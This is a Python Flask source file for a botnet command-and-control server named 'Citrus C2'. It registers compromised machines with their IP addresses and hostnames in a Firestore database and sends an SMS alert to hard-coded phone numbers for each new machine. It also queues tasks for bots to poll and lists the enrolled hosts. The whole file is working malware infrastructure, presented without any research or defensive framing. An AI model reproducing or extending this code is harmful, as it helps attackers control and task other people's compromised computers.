from flask import jsonify, request, Blueprint

import firebase_admin
from firebase_admin import credentials, firestore

import uuid

from . import routes

from twilio.rest import Client

from dotenv import load_dotenv
import os

client_api = Blueprint('client_api', __name__)
load_dotenv()

#Twilio
account_sid = os.getenv('twilio_account_sid')
auth_token  = os.getenv('twilio_auth_token')
client = Client(account_sid, auth_token)

# Firestore/Firebase Stuff
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

@routes.route('/bot/register/<string:hostname>', methods=['POST'])
def index(hostname):
    id = str(uuid.uuid4())

    db.collection('machines').add({
        'uuid': id,
        'ip': request.remote_addr,
        'hostname': hostname,
        'poll_rate': 5,
        'tasks': [],
    })

    message = client.messages.create(
        to="+17148512888", 
        from_="+12185208855",
        body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
    )

    return {'uuid': id}


@routes.route('/bot/poll', methods=['GET'])
def poll():
    machines = db.collection('machines').where(
        'uuid', '==', request.headers.get('uuid')).limit(1).get()

    if not machines:
        return {'Error': 'No machines found'}

    machine = machines[0]
    tasks = machine.to_dict()['tasks']

    if tasks:
        task = tasks.pop(0)
        machine.reference.update({'tasks': tasks})
        return {'task': task}

    return ({'task': None}, 418)


@routes.route('/bot/info', methods=['GET'])
def info():
    machines = db.collection('machines').get()

    res = []

    for x in machines:
        print(x.to_dict())
        tmp = {}
        tmp['hostname'] = x.to_dict()['hostname']
        tmp['uuid']=x.to_dict()['uuid']
        res.append(tmp)
    return jsonify(res)